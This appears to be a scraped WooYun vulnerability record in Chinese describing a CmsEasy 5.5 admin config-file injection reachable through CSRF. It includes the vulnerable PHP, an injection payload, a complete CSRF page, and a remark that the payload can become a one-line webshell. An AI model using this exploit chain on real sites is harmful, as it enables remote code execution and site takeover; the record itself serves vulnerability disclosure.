{"id": 51110, "wybug_id": "wooyun-2014-075682", "wybug_title": "cmseasy 后台csrf缓存配置文件可导致getshell(2)", "wybug_corp": "cmseasy", "wybug_author": "menmen519", "wybug_date": "2014-09-15 10:41", "wybug_open_date": "2014-12-14 10:42", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷", "逻辑错误", "源码审核", "源码分析"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-14：\t细节向公众公开  简要描述： cmseasy 管理员身份 后台缓存配置文件，没有过滤一个字符导致getshell(2) 详细说明：  直接到:\n\n然后我们分析代码：website_admin.php:(lines:25-43):\nfunction editwebsite_action() {    \tchkpw('website_edit');        if (front::post('submit')) {            $var = front::$post;            $path = ROOT.'/config/website/'.front::$post['path'].'.php';            $contenttmp = file_get_contents(ROOT.'/config/config.example.php');            if (is_array($var))                foreach ($var as $key=>$value) {                    $value=str_replace(\"'\",\"\\'\",$value);                    $contenttmp=preg_replace(\"%(\\'$key\\'=>)\\'.*?\\'(,\\s*//)%i\",\"$1'$value'$2\",$contenttmp);                }            @file_put_contents($path,$contenttmp);            //echo '<script type=\"text/javascript\">alert(\"操作完成！\")</script>';            front::refresh(url('website/listwebsite',true));        }        $path = ROOT.'/config/website/'.front::$get['id'].'.php';        $datatmp = include $path;        $this->view->data = $datatmp;    }\n我们找到这两句：\n$value=str_replace(\"'\",\"\\'\",$value);                    $contenttmp=preg_replace(\"%(\\'$key\\'=>)\\'.*?\\'(,\\s*//)%i\",\"$1'$value'$2\",$contenttmp);\n跟我上一个属于同一个毛病，转来转去的最终还是把\\' 转化成为\\\\'我们访问url:url：http://192.168.10.70/CmsEasy_5.5_UTF-8_20140818/uploads/index.php?case=website&act=editwebsite&table=&admin_dir=admin&site=defaultpostdata:name=%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB\\'%2bphpinfo(),//&path=test&site_url=http%3A%2F%2Fwww.cmseasy.cn%2F&site_username=admin&site_password=admin&site_admindir=admin&submit=%E6%8F%90%E4%BA%A4然后这个文件就会在config\\website生成一个test.php，我们访问一下看看:\n\n下来我们构造csrf文件:\n<html>  <body>    <script>\t   function csrf_sql(){\t\t\tvar xhr = new XMLHttpRequest();\t\t\txhr.open(\"POST\", \"http://192.168.10.70/CmsEasy_5.5_UTF-8_20140818/uploads/index.php?case=website&act=editwebsite&table=&admin_dir=admin&site=default\", true);\t\t\txhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\t\t\txhr.withCredentials = \"true\";\t\t\tvar body='name=%E5%85%AC%E5%8F%B8%E7%BD%91%E7%AB\\'%2bphpinfo(),//&path=test&site_url=http%3A%2F%2Fwww.cmseasy.cn%2F&site_username=admin&site_password=admin&site_admindir=admin&submit=%E6%8F%90%E4%BA%A4';\t\t\tvar aBody = new Uint8Array(body.length);\t\t\tfor (var i = 0; i < aBody.length; i++)\t\t\t  aBody[i] = body.charCodeAt(i);\t\t\txhr.send(new Blob([aBody]));\t   }\t \tcsrf_sql();    </script>  </body></html>\n我们放到另一台机器上去，然后发给管理员，管理员触发之后，看看这里是否生成了我们想要的shell:\n\n这个我们一看就不用担心，因为这是个配置文件，站点肯定会全局include的，当它include的时候这个phpinfo就会执行了，我们在此访问一下站点：\n\n\n\nok演示完毕，这里我们可以替换phpinfo 自己生成一个一句话木马即可   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-09-16 08:22 厂商回复： 感谢 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-15 11:15 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  必火留名啊!    \n     2014-09-24 11:30 |    \t\tStefanie \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:9        | 暂无)\t\t \n  服了。    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}